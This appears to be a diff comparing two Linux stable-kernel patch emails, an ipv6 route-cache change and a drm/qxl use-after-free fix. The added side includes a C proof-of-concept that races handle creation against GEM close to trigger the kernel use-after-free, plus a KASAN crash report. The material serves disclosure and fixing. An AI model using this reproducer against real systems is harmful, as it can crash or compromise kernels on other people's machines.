@@ -1,31 +1,29 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 73ADF15BD;
-	Sat, 13 Jan 2024 09:58:43 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 69B1EFC19;
+	Sat, 13 Jan 2024 09:58:46 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="k0cD2mkG"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id E6BD0C433C7;
-	Sat, 13 Jan 2024 09:58:42 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="LXV870XS"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id DAED0C43399;
+	Sat, 13 Jan 2024 09:58:45 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1705139923;
-	bh=hThYeWwaKpim1RqPxNGPs4oLUigMLtjYbucTPqAvmlY=;
+	s=korg; t=1705139926;
+	bh=qaISYywylLFd3qQB9KEAqrEewiKhuqkty+Hok3DUr9U=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=k0cD2mkG8awEs+2QvDe4QEnae3Nx8ShdASlmAlZ9WxPmkWATVt4BvLooOFA3aMoxx
-	 y16p32kdLJJWIi8hWrKh4oIIZg5AEHLW796CyroSR9XGYS7/EnpM02BpqnbwJG5lim
-	 vzSVJlPSC0EkqlWV9c/ZfdGPOfid+HHiuacfz0ZY=
+	b=LXV870XSZNhPjnARROlcq5zKmRYFm5jrX+QeIQVTsHEqVx3ROUCuQKaqqAm9NlXrC
+	 fAT9FNF1Rxy6heJ5jxrf9jEdkA/xt52KYw7Za+lx5lbkHVYu96RTgm8/5Z8ZgaOVV9
+	 H5yvTNciyoSmgUUzn9UVEFy5lQQGEEN+4UZTqKjI=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Andrea Mayer <andrea.mayer@uniroma2.it>,
-	Jon Maxwell <jmaxwell37@gmail.com>,
-	David Ahern <dsahern@kernel.org>,
-	Jakub Kicinski <kuba@kernel.org>,
-	"Jitindar Singh, Suraj" <surajjs@amazon.com>
-Subject: [PATCH 5.10 38/43] ipv6: remove max_size check inline with ipv4
-Date: Sat, 13 Jan 2024 10:50:17 +0100
-Message-ID: <20240113094208.179573000@linuxfoundation.org>
+	Wander Lairson Costa <wander@redhat.com>,
+	Dave Airlie <airlied@redhat.com>,
+	Fedor Pchelkin <pchelkin@ispras.ru>
+Subject: [PATCH 5.10 39/43] drm/qxl: fix UAF on handle creation
+Date: Sat, 13 Jan 2024 10:50:18 +0100
+Message-ID: <20240113094208.218729014@linuxfoundation.org>
 X-Mailer: git-send-email 2.43.0
 In-Reply-To: <20240113094206.930684111@linuxfoundation.org>
 References: <20240113094206.930684111@linuxfoundation.org>
@@ -44,202 +42,357 @@ Content-Transfer-Encoding: 8bit
 
 ------------------
 
-From: Jon Maxwell <jmaxwell37@gmail.com>
+From: Wander Lairson Costa <wander@redhat.com>
 
-commit af6d10345ca76670c1b7c37799f0d5576ccef277 upstream.
+commit c611589b4259ed63b9b77be6872b1ce07ec0ac16 upstream.
 
-In ip6_dst_gc() replace:
+qxl_mode_dumb_create() dereferences the qobj returned by
+qxl_gem_object_create_with_handle(), but the handle is the only one
+holding a reference to it.
 
-  if (entries > gc_thresh)
+A potential attacker could guess the returned handle value and closes it
+between the return of qxl_gem_object_create_with_handle() and the qobj
+usage, triggering a use-after-free scenario.
 
-With:
+Reproducer:
 
-  if (entries > ops->gc_thresh)
+int dri_fd =-1;
+struct drm_mode_create_dumb arg = {0};
 
-Sending Ipv6 packets in a loop via a raw socket triggers an issue where a
-route is cloned by ip6_rt_cache_alloc() for each packet sent. This quickly
-consumes the Ipv6 max_size threshold which defaults to 4096 resulting in
-these warnings:
+void gem_close(int handle);
 
-[1]   99.187805] dst_alloc: 7728 callbacks suppressed
-[2] Route cache is full: consider increasing sysctl net.ipv6.route.max_size.
-.
-.
-[300] Route cache is full: consider increasing sysctl net.ipv6.route.max_size.
+void* trigger(void* ptr)
+{
+	int ret;
+	arg.width = arg.height = 0x20;
+	arg.bpp = 32;
+	ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &arg);
+	if(ret)
+	{
+		perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
+		exit(-1);
+	}
+	gem_close(arg.handle);
+	while(1) {
+		struct drm_mode_create_dumb args = {0};
+		args.width = args.height = 0x20;
+		args.bpp = 32;
+		ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &args);
+		if (ret) {
+			perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
+			exit(-1);
+		}
 
-When this happens the packet is dropped and sendto() gets a network is
-unreachable error:
+		printf("[*] DRM_IOCTL_MODE_CREATE_DUMB created, %d\n", args.handle);
+		gem_close(args.handle);
+	}
+	return NULL;
+}
 
-remaining pkt 200557 errno 101
-remaining pkt 196462 errno 101
-.
-.
-remaining pkt 126821 errno 101
+void gem_close(int handle)
+{
+	struct drm_gem_close args;
+	args.handle = handle;
+	int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &args); // gem close handle
+	if (!ret)
+		printf("gem close handle %d\n", args.handle);
+}
 
-Implement David Aherns suggestion to remove max_size check seeing that Ipv6
-has a GC to manage memory usage. Ipv4 already does not check max_size.
+int main(void)
+{
+	dri_fd= open("/dev/dri/card0", O_RDWR);
+	printf("fd:%d\n", dri_fd);
 
-Here are some memory comparisons for Ipv4 vs Ipv6 with the patch:
+	if(dri_fd == -1)
+		return -1;
 
-Test by running 5 instances of a program that sends UDP packets to a raw
-socket 5000000 times. Compare Ipv4 and Ipv6 performance with a similar
-program.
+	pthread_t tid1;
 
-Ipv4:
+	if(pthread_create(&tid1,NULL,trigger,NULL)){
+		perror("[*] thread_create tid1\n");
+		return -1;
+	}
+	while (1)
+	{
+		gem_close(arg.handle);
+	}
+	return 0;
+}
 
-Before test:
+This is a KASAN report:
 
-MemFree:        29427108 kB
-Slab:             237612 kB
+==================================================================
+BUG: KASAN: slab-use-after-free in qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
+Write of size 1 at addr ffff88801136c240 by task poc/515
 
-ip6_dst_cache       1912   2528    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache        2881   3990    192   42    2 : tunables    0    0    0
+CPU: 1 PID: 515 Comm: poc Not tainted 6.3.0 #3
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-debian-1.16.0-4 04/01/2014
+Call Trace:
+<TASK>
+__dump_stack linux/lib/dump_stack.c:88
+dump_stack_lvl+0x48/0x70 linux/lib/dump_stack.c:106
+print_address_description linux/mm/kasan/report.c:319
+print_report+0xd2/0x660 linux/mm/kasan/report.c:430
+kasan_report+0xd2/0x110 linux/mm/kasan/report.c:536
+__asan_report_store1_noabort+0x17/0x30 linux/mm/kasan/report_generic.c:383
+qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
+drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
+drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
+drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
+drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
+vfs_ioctl linux/fs/ioctl.c:51
+__do_sys_ioctl linux/fs/ioctl.c:870
+__se_sys_ioctl linux/fs/ioctl.c:856
+__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
+do_syscall_x64 linux/arch/x86/entry/common.c:50
+do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
+entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
+RIP: 0033:0x7ff5004ff5f7
+Code: 00 00 00 48 8b 05 99 c8 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 69 c8 0d 00 f7 d8 64 89 01 48
 
-During test:
+RSP: 002b:00007ff500408ea8 EFLAGS: 00000286 ORIG_RAX: 0000000000000010
+RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff5004ff5f7
+RDX: 00007ff500408ec0 RSI: 00000000c02064b2 RDI: 0000000000000003
+RBP: 00007ff500408ef0 R08: 0000000000000000 R09: 000000000000002a
+R10: 0000000000000000 R11: 0000000000000286 R12: 00007fff1c6cdafe
+R13: 00007fff1c6cdaff R14: 00007ff500408fc0 R15: 0000000000802000
+</TASK>
 
-MemFree:        29417608 kB
-Slab:             247712 kB
+Allocated by task 515:
+kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
+kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
+kasan_save_alloc_info+0x1e/0x40 linux/mm/kasan/generic.c:510
+____kasan_kmalloc linux/mm/kasan/common.c:374
+__kasan_kmalloc+0xc3/0xd0 linux/mm/kasan/common.c:383
+kasan_kmalloc linux/./include/linux/kasan.h:196
+kmalloc_trace+0x48/0xc0 linux/mm/slab_common.c:1066
+kmalloc linux/./include/linux/slab.h:580
+kzalloc linux/./include/linux/slab.h:720
+qxl_bo_create+0x11a/0x610 linux/drivers/gpu/drm/qxl/qxl_object.c:124
+qxl_gem_object_create+0xd9/0x360 linux/drivers/gpu/drm/qxl/qxl_gem.c:58
+qxl_gem_object_create_with_handle+0xa1/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:89
+qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
+drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
+drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
+drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
+drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
+vfs_ioctl linux/fs/ioctl.c:51
+__do_sys_ioctl linux/fs/ioctl.c:870
+__se_sys_ioctl linux/fs/ioctl.c:856
+__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
+do_syscall_x64 linux/arch/x86/entry/common.c:50
+do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
+entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
 
-ip6_dst_cache       1912   2528    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache       44394  44394    192   42    2 : tunables    0    0    0
+Freed by task 515:
+kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
+kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
+kasan_save_free_info+0x2e/0x60 linux/mm/kasan/generic.c:521
+____kasan_slab_free linux/mm/kasan/common.c:236
+____kasan_slab_free+0x180/0x1f0 linux/mm/kasan/common.c:200
+__kasan_slab_free+0x12/0x30 linux/mm/kasan/common.c:244
+kasan_slab_free linux/./include/linux/kasan.h:162
+slab_free_hook linux/mm/slub.c:1781
+slab_free_freelist_hook+0xd2/0x1a0 linux/mm/slub.c:1807
+slab_free linux/mm/slub.c:3787
+__kmem_cache_free+0x196/0x2d0 linux/mm/slub.c:3800
+kfree+0x78/0x120 linux/mm/slab_common.c:1019
+qxl_ttm_bo_destroy+0x140/0x1a0 linux/drivers/gpu/drm/qxl/qxl_object.c:49
+ttm_bo_release+0x678/0xa30 linux/drivers/gpu/drm/ttm/ttm_bo.c:381
+kref_put linux/./include/linux/kref.h:65
+ttm_bo_put+0x50/0x80 linux/drivers/gpu/drm/ttm/ttm_bo.c:393
+qxl_gem_object_free+0x3e/0x60 linux/drivers/gpu/drm/qxl/qxl_gem.c:42
+drm_gem_object_free+0x5c/0x90 linux/drivers/gpu/drm/drm_gem.c:974
+kref_put linux/./include/linux/kref.h:65
+__drm_gem_object_put linux/./include/drm/drm_gem.h:431
+drm_gem_object_put linux/./include/drm/drm_gem.h:444
+qxl_gem_object_create_with_handle+0x151/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:100
+qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
+drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
+drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
+drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
+drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
+vfs_ioctl linux/fs/ioctl.c:51
+__do_sys_ioctl linux/fs/ioctl.c:870
+__se_sys_ioctl linux/fs/ioctl.c:856
+__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
+do_syscall_x64 linux/arch/x86/entry/common.c:50
+do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
+entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
 
-After test:
+The buggy address belongs to the object at ffff88801136c000
+which belongs to the cache kmalloc-1k of size 1024
+The buggy address is located 576 bytes inside of
+freed 1024-byte region [ffff88801136c000, ffff88801136c400)
 
-MemFree:        29422308 kB
-Slab:             238104 kB
+The buggy address belongs to the physical page:
+page:0000000089fc329b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11368
+head:0000000089fc329b order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
+flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
+raw: 000fffffc0010200 ffff888007841dc0 dead000000000122 0000000000000000
+raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
+page dumped because: kasan: bad access detected
 
-ip6_dst_cache       1912   2528    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache        3048   4116    192   42    2 : tunables    0    0    0
+Memory state around the buggy address:
+ffff88801136c100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+ffff88801136c180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+>ffff88801136c200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+^
+ffff88801136c280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+ffff88801136c300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+==================================================================
+Disabling lock debugging due to kernel taint
 
-Ipv6 with patch:
+Instead of returning a weak reference to the qxl_bo object, return the
+created drm_gem_object and let the caller decrement the reference count
+when it no longer needs it. As a convenience, if the caller is not
+interested in the gobj object, it can pass NULL to the parameter and the
+reference counting is descremented internally.
 
-Errno 101 errors are not observed anymore with the patch.
+The bug and the reproducer were originally found by the Zero Day Initiative project (ZDI-CAN-20940).
 
-Before test:
-
-MemFree:        29422308 kB
-Slab:             238104 kB
-
-ip6_dst_cache       1912   2528    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache        3048   4116    192   42    2 : tunables    0    0    0
-
-During Test:
-
-MemFree:        29431516 kB
-Slab:             240940 kB
-
-ip6_dst_cache      11980  12064    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache        3048   4116    192   42    2 : tunables    0    0    0
-
-After Test:
-
-MemFree:        29441816 kB
-Slab:             238132 kB
-
-ip6_dst_cache       1902   2432    256   32    2 : tunables    0    0    0
-xfrm_dst_cache         0      0    320   25    2 : tunables    0    0    0
-ip_dst_cache        3048   4116    192   42    2 : tunables    0    0    0
-
-Tested-by: Andrea Mayer <andrea.mayer@uniroma2.it>
-Signed-off-by: Jon Maxwell <jmaxwell37@gmail.com>
-Reviewed-by: David Ahern <dsahern@kernel.org>
-Link: https://lore.kernel.org/r/20230112012532.311021-1-jmaxwell37@gmail.com
-Signed-off-by: Jakub Kicinski <kuba@kernel.org>
-Cc: "Jitindar Singh, Suraj" <surajjs@amazon.com>
+Link: https://www.zerodayinitiative.com/
+Signed-off-by: Wander Lairson Costa <wander@redhat.com>
+Cc: stable@vger.kernel.org
+Reviewed-by: Dave Airlie <airlied@redhat.com>
+Signed-off-by: Dave Airlie <airlied@redhat.com>
+Link: https://patchwork.freedesktop.org/patch/msgid/20230814165119.90847-1-wander@redhat.com
+[pchelkin: The problem can be reproduced on 5.10 stable. It lacks commit
+ f4a84e165e6d ("drm/qxl: allocate dumb buffers in ram"). Adjust a small
+ conflict regarding that commit: it affects only where the buffers are
+ placed.]
+Signed-off-by: Fedor Pchelkin <pchelkin@ispras.ru>
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- include/net/dst_ops.h |    2 +-
- net/core/dst.c        |    8 ++------
- net/ipv6/route.c      |   13 +++++--------
- 3 files changed, 8 insertions(+), 15 deletions(-)
+ drivers/gpu/drm/qxl/qxl_drv.h   |    2 +-
+ drivers/gpu/drm/qxl/qxl_dumb.c  |    5 ++++-
+ drivers/gpu/drm/qxl/qxl_gem.c   |   25 +++++++++++++++++--------
+ drivers/gpu/drm/qxl/qxl_ioctl.c |    6 ++----
+ 4 files changed, 24 insertions(+), 14 deletions(-)
 
---- a/include/net/dst_ops.h
-+++ b/include/net/dst_ops.h
-@@ -16,7 +16,7 @@ struct dst_ops {
- 	unsigned short		family;
- 	unsigned int		gc_thresh;
- 
--	int			(*gc)(struct dst_ops *ops);
-+	void			(*gc)(struct dst_ops *ops);
- 	struct dst_entry *	(*check)(struct dst_entry *, __u32 cookie);
- 	unsigned int		(*default_advmss)(const struct dst_entry *);
- 	unsigned int		(*mtu)(const struct dst_entry *);
---- a/net/core/dst.c
-+++ b/net/core/dst.c
-@@ -83,12 +83,8 @@ void *dst_alloc(struct dst_ops *ops, str
- 
- 	if (ops->gc &&
- 	    !(flags & DST_NOCOUNT) &&
--	    dst_entries_get_fast(ops) > ops->gc_thresh) {
--		if (ops->gc(ops)) {
--			pr_notice_ratelimited("Route cache is full: consider increasing sysctl net.ipv6.route.max_size.\n");
--			return NULL;
--		}
--	}
-+	    dst_entries_get_fast(ops) > ops->gc_thresh)
-+		ops->gc(ops);
- 
- 	dst = kmem_cache_alloc(ops->kmem_cachep, GFP_ATOMIC);
- 	if (!dst)
---- a/net/ipv6/route.c
-+++ b/net/ipv6/route.c
-@@ -89,7 +89,7 @@ static struct dst_entry *ip6_negative_ad
- static void		ip6_dst_destroy(struct dst_entry *);
- static void		ip6_dst_ifdown(struct dst_entry *,
- 				       struct net_device *dev, int how);
--static int		 ip6_dst_gc(struct dst_ops *ops);
-+static void		 ip6_dst_gc(struct dst_ops *ops);
- 
- static int		ip6_pkt_discard(struct sk_buff *skb);
- static int		ip6_pkt_discard_out(struct net *net, struct sock *sk, struct sk_buff *skb);
-@@ -3184,11 +3184,10 @@ out:
- 	return dst;
- }
- 
--static int ip6_dst_gc(struct dst_ops *ops)
-+static void ip6_dst_gc(struct dst_ops *ops)
+--- a/drivers/gpu/drm/qxl/qxl_drv.h
++++ b/drivers/gpu/drm/qxl/qxl_drv.h
+@@ -329,7 +329,7 @@ int qxl_gem_object_create_with_handle(st
+ 				      u32 domain,
+ 				      size_t size,
+ 				      struct qxl_surface *surf,
+-				      struct qxl_bo **qobj,
++				      struct drm_gem_object **gobj,
+ 				      uint32_t *handle);
+ void qxl_gem_object_free(struct drm_gem_object *gobj);
+ int qxl_gem_object_open(struct drm_gem_object *obj, struct drm_file *file_priv);
+--- a/drivers/gpu/drm/qxl/qxl_dumb.c
++++ b/drivers/gpu/drm/qxl/qxl_dumb.c
+@@ -34,6 +34,7 @@ int qxl_mode_dumb_create(struct drm_file
  {
- 	struct net *net = container_of(ops, struct net, ipv6.ip6_dst_ops);
- 	int rt_min_interval = net->ipv6.sysctl.ip6_rt_gc_min_interval;
--	int rt_max_size = net->ipv6.sysctl.ip6_rt_max_size;
- 	int rt_elasticity = net->ipv6.sysctl.ip6_rt_gc_elasticity;
- 	int rt_gc_timeout = net->ipv6.sysctl.ip6_rt_gc_timeout;
- 	unsigned long rt_last_gc = net->ipv6.ip6_rt_last_gc;
-@@ -3196,11 +3195,10 @@ static int ip6_dst_gc(struct dst_ops *op
- 	int entries;
+ 	struct qxl_device *qdev = to_qxl(dev);
+ 	struct qxl_bo *qobj;
++	struct drm_gem_object *gobj;
+ 	uint32_t handle;
+ 	int r;
+ 	struct qxl_surface surf;
+@@ -62,11 +63,13 @@ int qxl_mode_dumb_create(struct drm_file
  
- 	entries = dst_entries_get_fast(ops);
--	if (entries > rt_max_size)
-+	if (entries > ops->gc_thresh)
- 		entries = dst_entries_get_slow(ops);
- 
--	if (time_after(rt_last_gc + rt_min_interval, jiffies) &&
--	    entries <= rt_max_size)
-+	if (time_after(rt_last_gc + rt_min_interval, jiffies))
- 		goto out;
- 
- 	fib6_run_gc(atomic_inc_return(&net->ipv6.ip6_rt_gc_expire), net, true);
-@@ -3210,7 +3208,6 @@ static int ip6_dst_gc(struct dst_ops *op
- out:
- 	val = atomic_read(&net->ipv6.ip6_rt_gc_expire);
- 	atomic_set(&net->ipv6.ip6_rt_gc_expire, val - (val >> rt_elasticity));
--	return entries > rt_max_size;
+ 	r = qxl_gem_object_create_with_handle(qdev, file_priv,
+ 					      QXL_GEM_DOMAIN_SURFACE,
+-					      args->size, &surf, &qobj,
++					      args->size, &surf, &gobj,
+ 					      &handle);
+ 	if (r)
+ 		return r;
++	qobj = gem_to_qxl_bo(gobj);
+ 	qobj->is_dumb = true;
++	drm_gem_object_put(gobj);
+ 	args->pitch = pitch;
+ 	args->handle = handle;
+ 	return 0;
+--- a/drivers/gpu/drm/qxl/qxl_gem.c
++++ b/drivers/gpu/drm/qxl/qxl_gem.c
+@@ -72,32 +72,41 @@ int qxl_gem_object_create(struct qxl_dev
+ 	return 0;
  }
  
- static int ip6_nh_lookup_table(struct net *net, struct fib6_config *cfg,
-@@ -6363,7 +6360,7 @@ static int __net_init ip6_route_net_init
- #endif
++/*
++ * If the caller passed a valid gobj pointer, it is responsible to call
++ * drm_gem_object_put() when it no longer needs to acess the object.
++ *
++ * If gobj is NULL, it is handled internally.
++ */
+ int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
+ 				      struct drm_file *file_priv,
+ 				      u32 domain,
+ 				      size_t size,
+ 				      struct qxl_surface *surf,
+-				      struct qxl_bo **qobj,
++				      struct drm_gem_object **gobj,
+ 				      uint32_t *handle)
+ {
+-	struct drm_gem_object *gobj;
+ 	int r;
++	struct drm_gem_object *local_gobj;
  
- 	net->ipv6.sysctl.flush_delay = 0;
--	net->ipv6.sysctl.ip6_rt_max_size = 4096;
-+	net->ipv6.sysctl.ip6_rt_max_size = INT_MAX;
- 	net->ipv6.sysctl.ip6_rt_gc_min_interval = HZ / 2;
- 	net->ipv6.sysctl.ip6_rt_gc_timeout = 60*HZ;
- 	net->ipv6.sysctl.ip6_rt_gc_interval = 30*HZ;
+-	BUG_ON(!qobj);
+ 	BUG_ON(!handle);
+ 
+ 	r = qxl_gem_object_create(qdev, size, 0,
+ 				  domain,
+ 				  false, false, surf,
+-				  &gobj);
++				  &local_gobj);
+ 	if (r)
+ 		return -ENOMEM;
+-	r = drm_gem_handle_create(file_priv, gobj, handle);
++	r = drm_gem_handle_create(file_priv, local_gobj, handle);
+ 	if (r)
+ 		return r;
+-	/* drop reference from allocate - handle holds it now */
+-	*qobj = gem_to_qxl_bo(gobj);
+-	drm_gem_object_put(gobj);
++
++	if (gobj)
++		*gobj = local_gobj;
++	else
++		/* drop reference from allocate - handle holds it now */
++		drm_gem_object_put(local_gobj);
++
+ 	return 0;
+ }
+ 
+--- a/drivers/gpu/drm/qxl/qxl_ioctl.c
++++ b/drivers/gpu/drm/qxl/qxl_ioctl.c
+@@ -39,7 +39,6 @@ static int qxl_alloc_ioctl(struct drm_de
+ 	struct qxl_device *qdev = to_qxl(dev);
+ 	struct drm_qxl_alloc *qxl_alloc = data;
+ 	int ret;
+-	struct qxl_bo *qobj;
+ 	uint32_t handle;
+ 	u32 domain = QXL_GEM_DOMAIN_VRAM;
+ 
+@@ -51,7 +50,7 @@ static int qxl_alloc_ioctl(struct drm_de
+ 						domain,
+ 						qxl_alloc->size,
+ 						NULL,
+-						&qobj, &handle);
++						NULL, &handle);
+ 	if (ret) {
+ 		DRM_ERROR("%s: failed to create gem ret=%d\n",
+ 			  __func__, ret);
+@@ -393,7 +392,6 @@ static int qxl_alloc_surf_ioctl(struct d
+ {
+ 	struct qxl_device *qdev = to_qxl(dev);
+ 	struct drm_qxl_alloc_surf *param = data;
+-	struct qxl_bo *qobj;
+ 	int handle;
+ 	int ret;
+ 	int size, actual_stride;
+@@ -413,7 +411,7 @@ static int qxl_alloc_surf_ioctl(struct d
+ 						QXL_GEM_DOMAIN_SURFACE,
+ 						size,
+ 						&surf,
+-						&qobj, &handle);
++						NULL, &handle);
+ 	if (ret) {
+ 		DRM_ERROR("%s: failed to create gem ret=%d\n",
+ 			  __func__, ret);
 
 
